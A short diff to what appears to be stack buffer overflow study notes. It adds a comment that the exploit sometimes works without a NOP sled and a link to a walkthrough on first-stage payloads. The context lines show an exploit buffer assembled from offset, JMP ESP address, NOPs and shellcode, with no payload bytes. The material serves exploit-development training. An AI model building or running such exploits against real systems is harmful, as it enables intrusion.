@@ -182,6 +182,7 @@ nops = "\x90"*16
 
 end = "\r\n"
 
+# NOTE: Sometimes works without NOPS
 buffer = cmd + offset + jmp_esp + stuff + nops + shellcode + end
 
 try:
@@ -198,6 +199,7 @@ except Exception as e:
 
 ### 9. EXTRA
 
+See here for a walkthrough of using a "first stage payload": https://steflan-security.com/complete-guide-to-stack-buffer-overflow-oscp/
 
 Running out of shell code space?
 
